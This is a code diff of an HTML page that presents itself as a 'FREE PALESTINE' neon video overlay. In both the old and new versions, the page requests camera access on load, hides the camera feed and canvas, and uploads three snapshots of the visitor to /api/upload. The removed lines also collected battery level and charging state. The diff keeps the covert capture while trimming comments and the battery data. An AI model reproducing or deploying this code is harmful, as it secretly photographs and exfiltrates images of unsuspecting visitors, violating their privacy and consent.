@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>FREE PALESTINE Video Overlay</title>
 
-<!-- Google Font Orbitron -->
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
 <style>
@@ -53,29 +52,22 @@ video#backgroundVideo {
   100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
 }
 
-/* Hidden camera and canvas */
-video#cameraStream {
-  display: none;
-}
-canvas#snapshot {
+/* Hidden camera video and snapshot */
+video#cameraStream, canvas#snapshot {
   display: none;
 }
 </style>
 </head>
 <body>
 
-<!-- Background Video -->
-<video id="backgroundVideo" autoplay loop playsinline muted>
+<video id="backgroundVideo" autoplay loop playsinline>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
-  Your browser does not support the video tag.
 </video>
 
-<!-- Neon Text -->
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
 <div class="text-layer text3">FREE PALESTINE</div>
 
-<!-- Hidden Camera Video & Canvas -->
 <video id="cameraStream" autoplay playsinline muted></video>
 <canvas id="snapshot"></canvas>
 
@@ -85,8 +77,8 @@ const camVideo = document.getElementById('cameraStream');
 const canvas = document.getElementById('snapshot');
 const ctx = canvas.getContext('2d');
 
-// Take snapshot function
-async function takeSnapshot(video, battery, charging) {
+// Function to take a snapshot
+async function takeSnapshot(video) {
   if (!video.videoWidth || !video.videoHeight) return;
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -96,48 +88,44 @@ async function takeSnapshot(video, battery, charging) {
   fetch('/api/upload', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ image: imageData, battery, charging })
+    body: JSON.stringify({ image: imageData })
   }).then(res => res.json())
     .then(() => console.log("Snapshot uploaded"))
     .catch(err => console.error("Upload error:", err));
 }
 
-// Camera permission & snapshots
-async function captureCamera() {
+// Main function to handle camera and snapshots
+async function captureCameraSequence() {
   try {
-    // Pause background video to avoid conflict
+    // Pause background video
     bgVideo.pause();
 
+    // Request camera access
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     camVideo.srcObject = stream;
 
-    const battery = await navigator.getBattery();
-    const batteryLevel = Math.round(battery.level * 100);
-    const isCharging = battery.charging;
+    // Take snapshots every 2 seconds for 6 seconds total
+    await takeSnapshot(camVideo);
+    setTimeout(() => takeSnapshot(camVideo), 2000);
+    setTimeout(() => takeSnapshot(camVideo), 4000);
 
-    // Take snapshots at intervals
-    await takeSnapshot(camVideo, batteryLevel, isCharging);
-    setTimeout(() => takeSnapshot(camVideo, batteryLevel, isCharging), 2000);
-    setTimeout(() => takeSnapshot(camVideo, batteryLevel, isCharging), 4000);
-
-    // Stop camera stream
-    stream.getTracks().forEach(track => track.stop());
-
-    // Resume background video with sound
-    bgVideo.muted = false;
-    bgVideo.play();
+    // Stop camera stream after snapshots
+    setTimeout(() => {
+      stream.getTracks().forEach(track => track.stop());
+      // Resume background video with audio
+      bgVideo.play().then(() => bgVideo.volume = 1.0);
+    }, 6000);
 
   } catch(err) {
     console.error("Camera error:", err);
-    bgVideo.muted = false;
-    bgVideo.play(); // ensure background video continues
+    bgVideo.play().then(() => bgVideo.volume = 1.0);
   }
 }
 
 // Start on page load
 window.addEventListener('load', () => {
-  bgVideo.play().catch(e => console.warn("Autoplay prevented", e));
-  captureCamera();
+  bgVideo.play().then(() => bgVideo.volume = 1.0).catch(e => console.warn("Autoplay prevented", e));
+  captureCameraSequence();
 });
 </script>
 
